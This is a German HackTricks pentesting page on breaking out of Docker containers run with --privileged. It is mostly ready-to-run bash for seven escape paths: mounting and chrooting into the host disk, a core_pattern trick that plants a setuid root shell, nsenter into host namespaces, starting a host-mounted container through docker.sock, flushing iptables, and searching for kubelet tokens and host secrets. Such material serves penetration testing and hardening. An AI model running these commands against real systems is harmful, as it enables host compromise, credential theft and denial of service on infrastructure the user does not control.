# Escape aus `--privileged`-Containern

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Ein mit `--privileged` gestarteter Container ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere standardmäßige Laufzeitschutzmaßnahmen, die die Workload normalerweise von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin von der Runtime und dem Host ab, aber für Docker ergibt sich normalerweise Folgendes:

- alle Capabilities werden gewährt
- die Einschränkungen der Device-cgroup werden aufgehoben
- viele Kernel-Dateisysteme werden nicht mehr schreibgeschützt eingebunden
- standardmäßig maskierte procfs-Pfade verschwinden
- die seccomp-Filterung wird deaktiviert
- die AppArmor-Einschränkung wird deaktiviert
- die SELinux-Isolation wird deaktiviert oder durch ein deutlich umfassenderes Label ersetzt

Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise **keinen** subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach direkt mit Host-Geräten, hostseitig zugänglichen Kernel-Dateisystemen oder Runtime-Schnittstellen interagieren und anschließend in eine Host-Shell wechseln.

## Was `--privileged` nicht automatisch ändert

`--privileged` tritt **nicht** automatisch den PID-, Netzwerk-, IPC- oder UTS-Namespaces des Hosts bei. Ein privilegierter Container kann weiterhin private Namespaces besitzen. Das bedeutet, dass einige Escape-Ketten eine zusätzliche Bedingung erfordern, zum Beispiel:

- ein Host-Bind-Mount
- gemeinsam genutzte Host-PIDs
- Host-Networking
- sichtbare Host-Geräte
- schreibbare proc/sys-Schnittstellen

Diese Bedingungen lassen sich bei realen Fehlkonfigurationen oft leicht erfüllen, sind aber konzeptionell von `--privileged` selbst getrennt.

## Escape-Pfade

### 1. Die Host-Festplatte über offengelegte Geräte mounten

Ein privilegierter Container sieht normalerweise deutlich mehr Gerätedateien unter `/dev`. Wenn das Blockgerät des Hosts sichtbar ist, besteht der einfachste Escape darin, es zu mounten und mit `chroot` in das Host-Dateisystem zu wechseln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Wenn die Root-Partition nicht offensichtlich ist, ermittle zuerst das Block-Layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Wenn der praktische Weg darin besteht, einen setuid-Helfer in einem beschreibbaren Host-Mount zu platzieren, anstatt `chroot` zu verwenden, sollte man daran denken, dass nicht jedes Dateisystem das setuid-Bit berücksichtigt. Eine schnelle hostseitige Überprüfung der Fähigkeiten ist:
```bash
mount | grep -v "nosuid"
```
Dies ist nützlich, weil beschreibbare Pfade unter `nosuid`-Dateisystemen für klassische Workflows wie „eine setuid-Shell ablegen und später ausführen“ deutlich weniger interessant sind.

Die hier ausgenutzten abgeschwächten Schutzmechanismen sind:

- vollständige Gerätefreigabe
- weitreichende Capabilities, insbesondere `CAP_SYS_ADMIN`

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Einen Host-Bind-Mount mounten oder wiederverwenden und `chroot` verwenden

Wenn das Root-Dateisystem des Hosts bereits innerhalb des Containers gemountet ist oder der Container die erforderlichen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn kein Bind-Mount des Host-Roots existiert, der Host-Speicher aber erreichbar ist, erstelle einen:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Dieser Pfad missbraucht:

- geschwächte Mount-Einschränkungen
- vollständige Capabilities
- fehlende MAC-Einschränkung

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Beschreibbaren `/proc/sys`- oder `/sys`-Bereich missbrauchen

Eine der weitreichenden Folgen von `--privileged` besteht darin, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können hostseitige Kernel-Schnittstellen offengelegt werden, die normalerweise maskiert oder schreibgeschützt eingebunden sind.

Ein klassisches Beispiel ist `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Weitere besonders wertvolle Pfade sind:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Dieser Weg missbraucht:

- fehlende maskierte Pfade
- fehlende schreibgeschützte Systempfade

Verwandte Seiten:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Vollständige Capabilities für einen Mount- oder Namespace-basierten Escape verwenden

Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standard-Containern entfernt werden, darunter `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und viele weitere. Das reicht häufig aus, um aus einem lokalen Foothold einen Host-Escape zu machen, sobald eine weitere exponierte Angriffsfläche vorhanden ist.

Ein einfaches Beispiel ist das Mounten zusätzlicher Dateisysteme und die Verwendung des Namespace-Eintritts:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Wenn die Host-PID ebenfalls geteilt wird, wird der Schritt noch kürzer:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Dieser Pfad missbraucht:

- den standardmäßigen privilegierten Capability-Satz
- optionales hostseitiges PID-Sharing

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape durch Runtime-Sockets

Ein privilegierter Container hat häufig den Runtime-Status oder Sockets des Hosts sichtbar. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, besteht der einfachste Ansatz oft darin, die Runtime-API zu verwenden, um einen zweiten Container mit Host-Zugriff zu starten:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Für containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Dieser Pfad missbraucht:

- privilegierten Runtime-Zugriff
- über die Runtime selbst erstellte Host-Bind-Mounts

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Nebeneffekte der Netzwerkisolation entfernen

`--privileged` tritt nicht automatisch dem Host-Netzwerk-Namespace bei. Wenn der Container jedoch zusätzlich `--network=host` oder anderen Zugriff auf das Host-Netzwerk hat, wird der gesamte Netzwerk-Stack veränderbar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dies ist nicht immer eine direkte Host-Shell, kann jedoch zu Denial of Service, Traffic-Interception oder Zugriff auf Management-Dienste führen, die nur über Loopback erreichbar sind.

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host-Secrets und Runtime-Zustand lesen

Selbst wenn ein sauberer Shell-Escape nicht sofort möglich ist, haben privilegierte Container oft ausreichend Zugriff, um Host-Secrets, den Kubelet-Zustand, Runtime-Metadaten und die Dateisysteme benachbarter Container zu lesen:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Wenn `/var` vom Host eingebunden ist oder die Runtime-Verzeichnisse sichtbar sind, kann dies bereits vor dem Erlangen einer Host-Shell für lateral movement oder den Diebstahl von Cloud-/Kubernetes-Credentials ausreichen.

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Prüfungen

Die folgenden Befehle sollen bestätigen, welche Families für den Escape aus privilegierten Containern unmittelbar nutzbar sind.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Was ist hier interessant:

- ein vollständiger Capability-Satz, insbesondere `CAP_SYS_ADMIN`
- Schreibzugriff auf proc/sys
- sichtbare Host-Geräte
- fehlendes seccomp und fehlende MAC-Isolierung
- Runtime-Sockets oder Bind-Mounts des Host-Root-Verzeichnisses

Jeder einzelne dieser Punkte kann für post-exploitation ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional nur ein oder zwei Befehle von einer Kompromittierung des Hosts entfernt ist.

## Verwandte Seiten

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Referenzen

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
